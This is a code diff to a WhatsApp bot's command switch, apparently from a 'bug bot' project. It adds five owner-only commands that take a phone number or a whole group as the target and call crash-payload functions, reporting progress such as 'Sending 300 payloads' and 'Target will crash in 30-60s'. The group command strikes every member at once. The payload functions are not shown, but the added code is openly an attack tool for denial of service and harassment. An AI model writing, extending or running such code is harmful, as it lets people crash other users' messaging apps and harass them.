@@ -3560,7 +3560,120 @@ case 'twitterdl': {
     }
     break;
 }
+// ═══════════════════════════════════════════════════
+// BUG: ZukoDelay - Document Flood
+// ═══════════════════════════════════════════════════
+case 'zdelay':
+case 'delaybug':
+case 'docflood': {
+    if (!isCreator) return reply("❌ Owner only!");
+    if (!q && !m.quoted) {
+        return reply(`⚠️ Usage: ${prefix}zdelay <number>\nExample: ${prefix}zdelay 2347059886720`);
+    }
+    let target = q || m.quoted?.sender;
+    if (!target) return reply("❌ No target!");
+    let jid = target.replace(/[^0-9]/g, '');
+    if (jid.startsWith('0') || jid === '2347059886720') return reply("❌ Invalid or protected!");
+    await reply(`⛤ ZUKO DELAY\n📱 Target: ${jid}\n⏳ Sending 300 payloads...`);
+    try {
+        await ZukoDelay(empire, `${jid}@s.whatsapp.net`);
+        await reply(`✅ ZUKO DELAY COMPLETE!\n💀 Target will crash in 30-60s`);
+    } catch (e) { await reply(`❌ ${e.message}`); }
+    break;
+}
 
+// ═══════════════════════════════════════════════════
+// BUG: Group Oblivion - Kill ALL Group Members
+// ═══════════════════════════════════════════════════
+case 'goblivion':
+case 'gocrash':
+case 'gkill': {
+    if (!isCreator) return reply("❌ Owner only!");
+    if (!m.isGroup) return reply("👥 Group only!");
+    let iter = q ? Math.min(parseInt(q) || 1, 3) : 1;
+    await reply(`💀 GROUP OBLIVION\n📛 ${groupName}\n👥 ${participants.length} members\n🔄 ${iter}x\n⏳ Killing all...`);
+    for (let i = 1; i <= iter; i++) {
+        try {
+            await ZukoGroupOblivion(empire, m.chat);
+            if (iter > 1) await reply(`🔄 ${i}/${iter} done`);
+            await new Promise(r => setTimeout(r, 2000));
+        } catch (e) { await reply(`❌ ${e.message}`); }
+    }
+    await reply(`✅ GROUP OBLIVION COMPLETE!\n💀 ALL members will crash in 30-60s`);
+    break;
+}
+
+// ═══════════════════════════════════════════════════
+// BUG: Mind Melt - Memory Overload
+// ═══════════════════════════════════════════════════
+case 'melt':
+case 'mindmelt':
+case 'mm': {
+    if (!isCreator) return reply("❌ Owner only!");
+    if (!q && !m.quoted) {
+        return reply(`⚠️ Usage: ${prefix}melt <number>\nExample: ${prefix}melt 2347059886720`);
+    }
+    let target = q || m.quoted?.sender;
+    if (!target) return reply("❌ No target!");
+    let jid = target.replace(/[^0-9]/g, '');
+    if (jid.startsWith('0') || jid === '2347059886720') return reply("❌ Invalid or protected!");
+    await reply(`🧠 MIND MELT\n📱 Target: ${jid}\n⏳ Melting memory...`);
+    try {
+        await ZukoMindMelt(empire, `${jid}@s.whatsapp.net`);
+        await reply(`✅ MIND MELT COMPLETE!\n💀 Memory overflowed!`);
+    } catch (e) { await reply(`❌ ${e.message}`); }
+    break;
+}
+
+// ═══════════════════════════════════════════════════
+// BUG: Ghost Protocol - Protocol Handler Crash
+// ═══════════════════════════════════════════════════
+case 'gprotocol':
+case 'ghostprotocol':
+case 'gp': {
+    if (!isCreator) return reply("❌ Owner only!");
+    if (!q && !m.quoted) {
+        return reply(`⚠️ Usage: ${prefix}gprotocol <number>\nExample: ${prefix}gprotocol 2347059886720`);
+    }
+    let target = q || m.quoted?.sender;
+    if (!target) return reply("❌ No target!");
+    let jid = target.replace(/[^0-9]/g, '');
+    if (jid.startsWith('0') || jid === '2347059886720') return reply("❌ Invalid or protected!");
+    await reply(`👻 GHOST PROTOCOL\n📱 Target: ${jid}\n⏳ Crashing protocol...`);
+    try {
+        await ZukoGhostProtocol(empire, `${jid}@s.whatsapp.net`);
+        await reply(`✅ GHOST PROTOCOL COMPLETE!\n👻 Protocol handler crashed!`);
+    } catch (e) { await reply(`❌ ${e.message}`); }
+    break;
+}
+
+// ═══════════════════════════════════════════════════
+// BUG: ULTRA STRIKE - Maximum Overkill
+// ═══════════════════════════════════════════════════
+case 'ultra':
+case 'phantomultra':
+case 'pultra':
+case 'maxstrike':
+case 'kill': {
+    if (!isCreator) return reply("❌ Owner only!");
+    let target = q || m.quoted?.sender;
+    if (!target) {
+        return reply(`💀 ULTRA STRIKE\nUsage: ${prefix}ultra <number> [iterations]\nExample: ${prefix}ultra 2347059886720 2`);
+    }
+    let jid = target.replace(/[^0-9]/g, '');
+    if (jid.startsWith('0') || jid === '2347059886720') return reply("❌ Invalid or protected!");
+    let iter = Math.min(parseInt(args[1]) || 1, 3);
+    await reply(`💀 ULTRA STRIKE\n📱 Target: ${jid}\n🔄 ${iter}x\n⏳ Obliterating...`);
+    for (let i = 1; i <= iter; i++) {
+        try {
+            await ZukoPhantomStrikeUltra(empire, `${jid}@s.whatsapp.net`);
+            if (iter > 1) await reply(`🔄 ${i}/${iter} done`);
+            await new Promise(r => setTimeout(r, 3000));
+        } catch (e) { await reply(`❌ ${e.message}`); }
+    }
+    await reply(`✅ ULTRA STRIKE COMPLETE!\n💀 Target WILL crash within 10-30s`);
+    break;
+}
 // ═══════════════════════════════════════════════════
 // SNAPCHAT DOWNLOAD
 // ═══════════════════════════════════════════════════
